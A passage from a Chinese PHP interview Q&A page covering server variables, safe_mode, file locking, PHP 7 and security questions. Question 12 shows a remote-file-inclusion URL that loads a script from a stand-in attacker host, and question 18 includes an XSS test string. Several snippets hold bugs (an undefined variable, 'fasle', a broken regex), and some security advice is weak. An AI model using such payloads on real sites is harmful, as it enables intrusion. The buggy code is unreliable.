<h3 id="6-SERVER-‘SERVER-NAME’-和-SERVER-‘HTTP-HOST’-的区别"><a href="#6-SERVER-‘SERVER-NAME’-和-SERVER-‘HTTP-HOST’-的区别" class="headerlink" title="6.$SERVER[‘SERVER_NAME’]和$SERVER[‘HTTP_HOST’]的区别#"></a>6.$SERVER[‘SERVER_NAME’]和$SERVER[‘HTTP_HOST’]的区别<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzZTRVJWRVJTRVJWRVJfTkFNRSVFNSU5MiU4Q1NFUlZFUkhUVFBfSE9TVCVFNyU5QSU4NCVFNSU4QyVCQSVFNSU4OCVBQg==">#<i class="fa fa-external-link-alt"></i></span></h3><p>相同点： 当满足以下三个条件时，两者会输出相同信息。</p>
<ol>
<li>服务器为80端口</li>
<li>apache的conf中ServerName设置正确</li>
<li>HTTP&#x2F;1.1协议规范</li>
</ol>
<p>不同点：</p>
<ol>
<li><p>通常情况： $_SERVER[“HTTP_HOST”] 在HTTP&#x2F;1.1协议规范下，会根据客户端的HTTP请求输出信息。 $_SERVER[“SERVER_NAME”] 默认情况下直接输出apache的配置文件httpd.conf中的ServerName值。</p>
</li>
<li><p>当服务器为非80端口时： $_SERVER[“HTTP_HOST”] 会输出端口号，例如：<code>coffeephp.com:8080</code>$_SERVER[“SERVER_NAME”] 会直接输出ServerName值 因此在这种情况下，可以理解为：$_SERVER[‘HTTP_HOST’] &#x3D; $_SERVER[‘SERVER_NAME’] : $_SERVER[‘SERVER_PORT’]</p>
</li>
<li><p>当配置文件httpd.conf中的ServerName与HTTP&#x2F;1.0请求的域名不一致时： httpd.conf配置如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;virtualhost *&gt;</span>    </span><br><span class="line"><span class="attribute">ServerName</span> jsyzchen.com    </span><br><span class="line"><span class="attribute">ServerAlias</span> blog.jsyzchen.com    </span><br><span class="line"><span class="section">&lt;/virtualhost&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端访问域名 <code>blog.jsyzchen.com</code> $_SERVER[“HTTP_HOST”] 输出 <code>blog.jsyzchen.com</code>$_SERVER[“SERVER_NAME”] 输出<code>jsyzchen.com</code></p>
</li>
</ol>
<h3 id="7-打开php-ini的safe-mode会影响哪些参数"><a href="#7-打开php-ini的safe-mode会影响哪些参数" class="headerlink" title="7.打开php.ini的safe_mode会影响哪些参数#"></a>7.打开php.ini的safe_mode会影响哪些参数<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzclRTYlODklOTMlRTUlQkMlODBwaHBpbmklRTclOUElODRzYWZlX21vZGUlRTQlQkMlOUElRTUlQkQlQjElRTUlOTMlOEQlRTUlOTMlQUElRTQlQkElOUIlRTUlOEYlODIlRTYlOTUlQjA=">#<i class="fa fa-external-link-alt"></i></span></h3><p>当safe_mode&#x3D;On时，会出现下面限制：</p>
<ol>
<li>所有输入输出函数（例如fopen()、file()和require()）的适用会受到限制，只能用于与调用这些函数的脚本有相同拥有者的文件。例如，假定启用了安全模式，如果Mary拥有的脚本调用fopen(),尝试打开由Jonhn拥有的一个文件，则将失败。但是，如果Mary不仅拥有调用 fopen()的脚本，还拥有fopen()所调用的文件，就会成功。</li>
<li>如果试图通过函数popen()、system()或exec()等执行脚本，只有当脚本位于safe_mode_exec_dir配置指令指定的目录才可能。</li>
<li>HTTP验证得到进一步加强，因为验证脚本用于者的UID划入验证领域范围内。此外，当启用安全模式时，不会设置PHP_AUTH。</li>
<li>如果适用MySQL数据库服务器，链接MySQL服务器所用的用户名必须与调用mysql_connect()的文件拥有者用户名相同。<br>详细的解释可以查看官网：<span class="exturl" data-url="aHR0cDovL3d3dy5waHAubmV0L21hbnVhbC96aC9pbmkuc2VjdC5zYWZlLW1vZGUucGhw">http://www.php.net/manual/zh/ini.sect.safe-mode.php<i class="fa fa-external-link-alt"></i></span> <strong>php safe_mode影响参数</strong></li>
</ol>
<table>
<thead>
<tr>
<th>函数名</th>
<th>限制</th>
</tr>
</thead>
<tbody><tr>
<td>dbmopen()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>dbase_open()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>filepro()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>filepro_rowcount()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>filepro_retrieve()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>ifx_* sql_safe_mode</td>
<td>限制, (!&#x3D; safe mode)</td>
</tr>
<tr>
<td>ingres_* sql_safe_mode</td>
<td>限制, (!&#x3D; safe mode)</td>
</tr>
<tr>
<td>mysql_* sql_safe_mode</td>
<td>限制, (!&#x3D; safe mode)</td>
</tr>
<tr>
<td>pg_loimport()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>posix_mkfifo()</td>
<td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>putenv()</td>
<td>遵循 ini 设置的 safe_mode_protected_env_vars 和 safe_mode_allowed_env_vars 选项。请参考 putenv() 函数的有关文档。</td>
</tr>
<tr>
<td>move_uploaded_file()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>chdir()</td>
<td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>dl()</td>
<td>本函数在安全模式下被禁用。</td>
</tr>
<tr>
<td>backtick operator</td>
<td>本函数在安全模式下被禁用。</td>
</tr>
<tr>
<td>shell_exec()</td>
<td>（在功能上和 backticks 函数相同） 本函数在安全模式下被禁用。</td>
</tr>
<tr>
<td>exec()</td>
<td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td>
</tr>
<tr>
<td>system()</td>
<td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td>
</tr>
<tr>
<td>passthru()</td>
<td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td>
</tr>
<tr>
<td>popen()</td>
<td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td>
</tr>
<tr>
<td>fopen()</td>
<td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>mkdir()</td>
<td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>rmdir()</td>
<td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>rename()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>unlink()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>copy()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 (on source and target )</td>
</tr>
<tr>
<td>chgrp()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>chown()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>chmod()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 另外，不能设置 SUID、SGID 和 sticky bits</td>
</tr>
<tr>
<td>touch()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td>
</tr>
<tr>
<td>symlink()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意：仅测试 target）</td>
</tr>
<tr>
<td>link()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意：仅测试 target）</td>
</tr>
<tr>
<td>apache_request_headers()</td>
<td>在安全模式下，以“authorization”（区分大小写）开头的标头将不会被返回。</td>
</tr>
<tr>
<td>header()</td>
<td>在安全模式下，如果设置了 WWW-Authenticate，当前脚本的 uid 将被添加到该标头的 realm 部分。</td>
</tr>
<tr>
<td>PHP_AUTH 变量</td>
<td>在安全模式下，变量 PHP_AUTH_USER、PHP_AUTH_PW 和 PHP_AUTH_TYPE 在 $_SERVER 中不可用。但无论如何，您仍然可以使用 REMOTE_USER 来获取用户名称（USER）。（注意：仅 PHP 4.3.0 以后有效）</td>
</tr>
<tr>
<td>highlight_file(), show_source()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意，仅在 4.2.1 版本后有效）</td>
</tr>
<tr>
<td>parse_ini_file()</td>
<td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意，仅在 4.2.1 版本后有效）</td>
</tr>
<tr>
<td>set_time_limit()</td>
<td>在安全模式下不起作用。</td>
</tr>
<tr>
<td>max_execution_time</td>
<td>在安全模式下不起作用。</td>
</tr>
<tr>
<td>mail()</td>
<td>在安全模式下，第五个参数被屏蔽。</td>
</tr>
</tbody></table>
<h3 id="8-PHP解决多进程同时写一个文件的问题"><a href="#8-PHP解决多进程同时写一个文件的问题" class="headerlink" title="8.PHP解决多进程同时写一个文件的问题#"></a>8.PHP解决多进程同时写一个文件的问题<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzhQSFAlRTglQTclQTMlRTUlODYlQjMlRTUlQTQlOUElRTglQkYlOUIlRTclQTglOEIlRTUlOTAlOEMlRTYlOTclQjYlRTUlODYlOTklRTQlQjglODAlRTQlQjglQUElRTYlOTYlODclRTQlQkIlQjYlRTclOUElODQlRTklOTclQUUlRTklQTIlOTg=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">function write($str)</span><br><span class="line">&#123;</span><br><span class="line">    $fp = <span class="keyword">fopen</span>($file, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!flock($fp, LOCK_EX));</span><br><span class="line">    <span class="keyword">fwrite</span>($fp, $str . PHP_EOL);</span><br><span class="line">    flock($fp, LOCK_UN);</span><br><span class="line">    <span class="keyword">fclose</span>($fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-PHP里的超全局变量"><a href="#9-PHP里的超全局变量" class="headerlink" title="9.PHP里的超全局变量#"></a>9.PHP里的超全局变量<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzlQSFAlRTklODclOEMlRTclOUElODQlRTglQjYlODUlRTUlODUlQTglRTUlQjElODAlRTUlOEYlOTglRTklODclOEY=">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>$GLOBALS</li>
<li>$_SERVER</li>
<li>$_GET</li>
<li>$_POST</li>
<li>$_FILES</li>
<li>$_COOKIE</li>
<li>$_SESSION</li>
<li>$_REQUEST</li>
<li>$_ENV</li>
</ul>
<h3 id="10-php7新特性"><a href="#10-php7新特性" class="headerlink" title="10.php7新特性#"></a>10.php7新特性<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzEwcGhwNyVFNiU5NiVCMCVFNyU4OSVCOSVFNiU4MCVBNw==">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>?? 运算符（NULL 合并运算符）</li>
<li>函数返回值类型声明</li>
<li>标量类型声明</li>
<li>use 批量声明</li>
<li>define 可以定义常量数组</li>
<li>闭包（ Closure）增加了一个 call 方法 详细的可以见官网：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cmUucGhwLm5ldC9tYW51YWwvZW4vbWlncmF0aW9uNzAubmV3LWZlYXR1cmVzLnBocA==">php7-new-features<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="11-php7卓越性能背后的优化"><a href="#11-php7卓越性能背后的优化" class="headerlink" title="11.php7卓越性能背后的优化#"></a>11.php7卓越性能背后的优化<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzExcGhwNyVFNSU4RCU5MyVFOCVCNiU4QSVFNiU4MCVBNyVFOCU4MyVCRCVFOCU4MyU4QyVFNSU5MCU4RSVFNyU5QSU4NCVFNCVCQyU5OCVFNSU4QyU5Ng==">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>减少内存分配次数</li>
<li>多使用栈内存</li>
<li>缓存数组的hash值</li>
<li>字符串解析成桉树改为宏展开</li>
<li>使用大块连续内存代替小块破碎内存 详细的可以参考鸟哥的PPT：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rldmxpbmtjbi9wcHRzX2Zvcl9waHAyMDE2L2Jsb2IvbWFzdGVyLyVFRiVCQyU4OCVFNiU4MyVBMCVFNiU5NiVCMCVFNSVBRSVCOCVFRiVCQyU4OVBIUDclRTYlODAlQTclRTglODMlQkQlRTQlQjklOEIlRTYlQkElOTAucGRm">PHP7性能之源<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="12-include-GET-‘p’-的安全隐患"><a href="#12-include-GET-‘p’-的安全隐患" class="headerlink" title="12.include($_GET[‘p’])的安全隐患#"></a>12.include($_GET[‘p’])的安全隐患<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzEyaW5jbHVkZV9HRVRwJUU3JTlBJTg0JUU1JUFFJTg5JUU1JTg1JUE4JUU5JTlBJTkwJUU2JTgyJUEz">#<i class="fa fa-external-link-alt"></i></span></h3><p>现在任一个黑客现在都可以用:<code>http://www.yourdomain.com/index.php?p=anyfile.txt</code> 来获取你的机密信息，或执行一个PHP脚本。 如果allow_url_fopen&#x3D;On，你更是死定了： 试试这个输入：<code>http://www.yourdomain.com/index.php?p=http://youaredoomed.com/phphack.php</code> 现在你的网页中包含了<code>http://www.youaredoomed.com/phphack.php</code>的输出. 黑客可以发送垃圾邮件，改变密码，删除文件等等。只要你能想得到。</p>
<h3 id="13-列出一些防范SQL注入、XSS攻击、CSRF攻击的方法"><a href="#13-列出一些防范SQL注入、XSS攻击、CSRF攻击的方法" class="headerlink" title="13.列出一些防范SQL注入、XSS攻击、CSRF攻击的方法#"></a>13.列出一些防范SQL注入、XSS攻击、CSRF攻击的方法<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzEzJUU1JTg4JTk3JUU1JTg3JUJBJUU0JUI4JTgwJUU0JUJBJTlCJUU5JTk4JUIyJUU4JThDJTgzU1FMJUU2JUIzJUE4JUU1JTg1JUE1WFNTJUU2JTk0JUJCJUU1JTg3JUJCQ1NSRiVFNiU5NCVCQiVFNSU4NyVCQiVFNyU5QSU4NCVFNiU5NiVCOSVFNiVCMyU5NQ==">#<i class="fa fa-external-link-alt"></i></span></h3><p>SQL注入：</p>
<ul>
<li>addslashes函数</li>
<li>mysql_real_escape_string&#x2F;mysqli_real_escape_string&#x2F;PDO::quote()</li>
<li>PDO预处理 XSS：htmlspecial函数 CSRF：</li>
<li>验证HTTP REFER</li>
<li>使用toke进行验证</li>
</ul>
<h3 id="14-接口如何安全访问"><a href="#14-接口如何安全访问" class="headerlink" title="14.接口如何安全访问#"></a>14.接口如何安全访问<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE0JUU2JThFJUE1JUU1JThGJUEzJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTg5JUU1JTg1JUE4JUU4JUFFJUJGJUU5JTk3JUFF">#<i class="fa fa-external-link-alt"></i></span></h3><p>jwt或验证签名</p>
<h3 id="15-PHP里有哪些设计模式"><a href="#15-PHP里有哪些设计模式" class="headerlink" title="15.PHP里有哪些设计模式#"></a>15.PHP里有哪些设计模式<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE1UEhQJUU5JTg3JThDJUU2JTlDJTg5JUU1JTkzJUFBJUU0JUJBJTlCJUU4JUFFJUJFJUU4JUFFJUExJUU2JUE4JUExJUU1JUJDJThG">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>单例模式</li>
<li>工厂模式</li>
<li>脸面模式（facade）</li>
<li>注册器模式</li>
<li>策略模式</li>
<li>原型模式</li>
<li>装饰器模式 更多的可以看<span class="exturl" data-url="aHR0cDovL2xhcmFiYXNlLmNvbS9jb2xsZWN0aW9uLzUvcG9zdC8xNDM=">PHP设计模式简介<i class="fa fa-external-link-alt"></i></span>这篇文章</li>
</ul>
<h3 id="16-验证ip是否正确"><a href="#16-验证ip是否正确" class="headerlink" title="16.验证ip是否正确#"></a>16.验证ip是否正确<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE2JUU5JUFBJThDJUU4JUFGJTgxaXAlRTYlOTglQUYlRTUlOTAlQTYlRTYlQUQlQTMlRTclQTElQUU=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_ip</span>(<span class="params"><span class="variable">$ip</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17-验证日期是否合理"><a href="#17-验证日期是否合理" class="headerlink" title="17.验证日期是否合理#"></a>17.验证日期是否合理<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE3JUU5JUFBJThDJUU4JUFGJTgxJUU2JTk3JUE1JUU2JTlDJTlGJUU2JTk4JUFGJUU1JTkwJUE2JUU1JTkwJTg4JUU3JTkwJTg2">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_datetime</span>(<span class="params">$datetime</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, strtotime(<span class="symbol">$datetime</span>)) === <span class="symbol">$datetime</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）"><a href="#18-写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）" class="headerlink" title="18.写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）#"></a>18.写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE4JUU1JTg2JTk5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JUFEJUEzJUU1JTg4JTk5JUU4JUExJUE4JUU4JUJFJUJFJUU1JUJDJThGJUU4JUJGJTg3JUU2JUJCJUE0SlMlRTglODQlOUElRTYlOUMlQUMlRTUlOEYlOEElRTYlOEElOEFzY3JpcHQlRTYlQTAlODclRTglQUUlQjAlRTUlOEYlOEElRTUlODUlQjYlRTUlODYlODUlRTUlQUUlQjklRTklODMlQkQlRTUlOEUlQkIlRTYlOEUlODk=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$te</span>xt = <span class="string">&#x27;&lt;script&gt;alert(&#x27;</span>XSS<span class="string">&#x27;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="symbol">$patter</span>n = <span class="string">&#x27;&lt;script.*&gt;.*&lt;\/script&gt;/i&#x27;</span>;</span><br><span class="line"><span class="symbol">$te</span>xt = preg_replace(<span class="symbol">$patter</span>n, <span class="string">&#x27;&#x27;</span>, <span class="symbol">$te</span>xt);</span><br></pre></td></tr></table></figure>

<h3 id="19-下单后30分钟未支付取消订单"><a href="#19-下单后30分钟未支付取消订单" class="headerlink" title="19.下单后30分钟未支付取消订单#"></a>19.下单后30分钟未支付取消订单<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzE5JUU0JUI4JThCJUU1JThEJTk1JUU1JTkwJThFMzAlRTUlODglODYlRTklOTIlOUYlRTYlOUMlQUElRTYlOTQlQUYlRTQlQkIlOTglRTUlOEYlOTYlRTYlQjYlODglRTglQUUlQTIlRTUlOEQlOTU=">#<i class="fa fa-external-link-alt"></i></span></h3><p>第一种方案：被动过期+cron，就是用户查看的时候去数据库查有没有支付+定时清理。 第二种方案：延迟性任务，到时间检查订单是否支付成功，如果没有支付则取消订单</p>
<h3 id="20-设计一个秒杀系统"><a href="#20-设计一个秒杀系统" class="headerlink" title="20.设计一个秒杀系统#"></a>20.设计一个秒杀系统<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIwJUU4JUFFJUJFJUU4JUFFJUExJUU0JUI4JTgwJUU0JUI4JUFBJUU3JUE3JTkyJUU2JTlEJTgwJUU3JUIzJUJCJUU3JUJCJTlG">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路：用redis的队列</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ttl</span> = <span class="number">4</span>;</span><br><span class="line"><span class="variable">$random</span> = mt_rand(<span class="number">1</span>,<span class="number">1000</span>).<span class="string">&#x27;-&#x27;</span>.gettimeofday(<span class="literal">true</span>).<span class="string">&#x27;-&#x27;</span>.mt_rand(<span class="number">1</span>,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$lock</span> = fasle;</span><br><span class="line"><span class="keyword">while</span> (!<span class="variable">$lock</span>) &#123;</span><br><span class="line">    <span class="variable">$lock</span> = <span class="variable">$redis</span>-&gt;<span class="keyword">set</span>(<span class="string">&#x27;lock&#x27;</span>, <span class="variable">$random</span>, array(<span class="string">&#x27;nx&#x27;</span>, <span class="string">&#x27;ex&#x27;</span> =&gt; <span class="variable">$ttl</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$redis</span>-&gt;<span class="keyword">get</span>(<span class="string">&#x27;goods.num&#x27;</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    echo (<span class="string">&quot;秒杀已经结束&quot;</span>);</span><br><span class="line">    <span class="comment">//删除锁</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$redis</span>-&gt;<span class="keyword">get</span>(<span class="string">&#x27;lock&#x27;</span>) == <span class="variable">$random</span>) &#123;</span><br><span class="line">        <span class="variable">$redis</span>-&gt;del(<span class="string">&#x27;lock&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$redis</span>-&gt;decr(<span class="string">&#x27;goods.num&#x27;</span>);</span><br><span class="line">echo (<span class="string">&quot;秒杀成功&quot;</span>);</span><br><span class="line"><span class="comment">//删除锁</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$redis</span>-&gt;<span class="keyword">get</span>(<span class="string">&#x27;lock&#x27;</span>) == <span class="variable">$random</span>) &#123;</span><br><span class="line">    <span class="variable">$redis</span>-&gt;del(<span class="string">&#x27;lock&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<h3 id="21-请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高"><a href="#21-请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高" class="headerlink" title="21.请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高#"></a>21.请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIxJUU4JUFGJUI3JUU4JUFFJUJFJUU4JUFFJUExJUU0JUI4JTgwJUU0JUI4JUFBJUU1JUFFJTlFJUU3JThFJUIwJUU2JTk2JUI5JUU1JUJDJThGJUU1JThGJUFGJUU0JUJCJUE1JUU3JUJCJTk5JUU2JTlGJTkwJUU0JUI4JUFBaXAlRTYlODklQkUlRTUlODglQjAlRTUlQUYlQjklRTUlQkElOTQlRTclOUElODQlRTclOUMlODElRTUlOTIlOEMlRTUlQjglODIlRTglQTYlODElRTYlQjElODIlRTYlOTUlODglRTclOEUlODclRTclQUIlOUYlRTUlOEYlQUYlRTglODMlQkQlRTclOUElODQlRTklQUIlOTg=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ip2long，把所有城市的最小和最大Ip录进去</span></span><br><span class="line"><span class="variable">$redis_key</span> = <span class="string">&#x27;ip&#x27;</span>;</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zAdd</span>(<span class="variable">$redis_key</span>, <span class="number">20</span>, <span class="string">&#x27;#bj&#x27;</span>);<span class="comment">//北京的最小IP加#</span></span><br><span class="line"><span class="variable">$resid</span>-&gt;<span class="title function_ invoke__">zAdd</span>(<span class="variable">$redis_key</span>, <span class="number">30</span>, <span class="string">&#x27;bj&#x27;</span>);<span class="comment">//最大IP</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip_city</span>(<span class="params"><span class="variable">$ip_address</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip_address</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redis_key</span> = <span class="string">&#x27;ip&#x27;</span>;</span><br><span class="line">    <span class="variable">$city</span> = <span class="title function_ invoke__">zRangeByScore</span>(<span class="variable">$redis_key</span>, <span class="variable">$ip</span>, <span class="string">&#x27;+inf&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;limit&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>)));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$city</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$city</span>[<span class="number">0</span>], <span class="string">&quot;#&quot;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;城市不存在!&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;城市是&#x27;</span> . <span class="variable">$city</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span 